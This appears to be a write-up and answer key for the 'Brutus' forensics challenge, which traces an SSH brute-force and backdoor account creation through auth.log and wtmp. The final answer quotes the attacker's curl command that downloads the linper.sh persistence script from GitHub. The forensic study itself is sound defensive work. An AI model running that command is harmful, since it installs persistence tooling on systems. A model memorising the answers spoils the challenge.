### Sherlock Scenario
```
In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.
```

### Download & unzip the file
```
┌──(alienx㉿alienX)-[~/Desktop/PPP/SHERLOCK/BRUTUS]
└─$ ls -la
total 72
drwxr-xr-x  2 alienx alienx  4096 Apr  9 21:30 .
drwxr-xr-x 12 alienx alienx  4096 Apr  9 21:25 ..
-rw-r--r--  1 alienx alienx  4242 Apr  9 21:24 Brutus.zip
-rw-r--r--  1 alienx alienx 43911 Mar  6 01:47 auth.log
-rw-r--r--  1 alienx alienx 11136 Mar  6 01:47 wtmp
```

### qns and answers

## qn1
```
172-31-35-28

Accepted password for root from 203.101.190.9 port 42825 ssh2
Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2


answer:65.2.161.68
```

## qn2
```
answer:root

HINT:
Mar  6 06:31:38 ip-172-31-35-28 sshd[2384]: Failed password for invalid user svc_account from 65.2.161.68 port 46732 ssh2
Mar  6 06:31:38 ip-172-31-35-28 sshd[2387]: Failed password for invalid user svc_account from 65.2.161.68 port 46742 ssh2
Mar  6 06:31:38 ip-172-31-35-28 sshd[2389]: Failed password for invalid user svc_account from 65.2.161.68 port 46744 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2391]: Failed password for invalid user svc_account from 65.2.161.68 port 46750 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2393]: Failed password for invalid user svc_account from 65.2.161.68 port 46774 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2394]: Failed password for invalid user svc_account from 65.2.161.68 port 46786 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2397]: Failed password for invalid user svc_account from 65.2.161.68 port 46814 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2398]: Failed password for invalid user svc_account from 65.2.161.68 port 46840 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2396]: Failed password for invalid user svc_account from 65.2.161.68 port 46800 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2400]: Failed password for invalid user svc_account from 65.2.161.68 port 46854 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2399]: Failed password for root from 65.2.161.68 port 46852 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2407]: Failed password for root from 65.2.161.68 port 46876 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2383]: Received disconnect from 65.2.161.68 port 46722:11: Bye Bye [preauth]
Mar  6 06:31:39 ip-172-31-35-28 sshd[2383]: Disconnected from invalid user svc_account 65.2.161.68 port 46722 [preauth] 
Mar  6 06:31:39 ip-172-31-35-28 sshd[2384]: Received disconnect from 65.2.161.68 port 46732:11: Bye Bye [preauth]
Mar  6 06:31:39 ip-172-31-35-28 sshd[2384]: Disconnected from invalid user svc_account 65.2.161.68 port 46732 [preauth] 
Mar  6 06:31:39 ip-172-31-35-28 sshd[2409]: Failed password for root from 65.2.161.68 port 46890 ssh2
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
```


## qn3
```

answer:2024-03-06T06:32:45
                                                                                                                                                                                                                                              
┌──(alienx㉿alienX)-[~/Desktop/PPP/SHERLOCK/BRUTUS]
└─$ utmpdump wtmp 
[7] [01583] [ts/0] [root    ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-03-06T06:19:55,151913+00:00]
[7] [02549] [ts/1] [root    ] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:32:45,387923+00:00]
[8] [02491] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [2024-03-06T06:37:24,590579+00:00]
[7] [02667] [ts/1] [cyberjunkie] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:37:35,475575+00:00]


HINT:
In Linux operating systems everything is logged some where. Most of the system logs are logged in to /var/log folder. This folder contains logs related to different services and applications. In this folder we have some files such as utmp, wtmp and btmp. These files contains all the details about login’s and logout’s which are from local as well as from remote systems and system status such as uptime etc.

utmp will give you complete picture of users logins at which terminals, logouts, system events and current status of the system, system boot time (used by uptime) etc.

wtmp gives historical data of utmp.

btmp records only failed login attempts.

# last ( Provide how logged in, when they logged in and when they logged out etc info on the screen.)

# last -f /var/log/wtmp (To open wtmp file and view its content use blow command)

# last -f /var/run/utmp (To see still logged in users view utmp file use last command)

# last -f /var/log/btmp (To view btmp file use same command)



```

## qn4
```
answer:37

HINT:
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root. 
```


## qn5
```
answer:cyberjunkie

HINT:
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
Mar  6 06:33:01 ip-172-31-35-28 CRON[2561]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:33:01 ip-172-31-35-28 CRON[2562]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:33:01 ip-172-31-35-28 CRON[2561]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:33:01 ip-172-31-35-28 CRON[2562]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:34:01 ip-172-31-35-28 CRON[2574]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:34:01 ip-172-31-35-28 CRON[2575]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:34:01 ip-172-31-35-28 CRON[2575]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:34:01 ip-172-31-35-28 CRON[2574]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie   
```

## qn 6
```

answer:T1136.001

HINT:(gemini)
This sub-technique describes attackers creating a new local account on the compromised server itself and potentially granting it high privileges for persistence.

Here's the reasoning:

    New User: The scenario mentions adding a new user, aligning with account creation.
    High Privileges: Granting the new user high privileges strengthens the attacker's persistence.
    Local Account: While the scenario doesn't explicitly state local vs domain account, focusing on persistence on the server suggests a local account creation.

While it's possible the attacker might use a domain account for persistence (T1136.002), the emphasis on the server itself points towards a local account being more likely.

Understanding the context and the specific details of the attack is crucial for accurate MITRE ATT&CK identification. Thank you for your patience and for helping me learn from my mistakes.
```

## qn 7
```
answer:279

HINT:

calculating the time difference from 06:32:45-06:37:24
```

## qn 8
```
answer: /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh


HINT:

```











